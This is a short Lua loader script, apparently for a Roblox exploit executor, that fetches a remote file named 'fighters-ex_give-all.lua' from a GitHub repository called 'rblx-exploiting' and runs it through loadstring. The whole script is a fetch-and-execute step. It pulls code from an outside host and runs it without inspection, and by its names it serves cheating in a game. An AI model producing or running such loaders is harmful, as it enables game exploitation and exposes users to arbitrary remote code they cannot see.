local request = request or (syn and syn.request)
local response = request({
   Method = "GET",
   Url = "https://raw.githubusercontent.com/25-67/rblx-exploiting/main/fighters-ex_give-all.lua"
})

loadstring(response.Body)()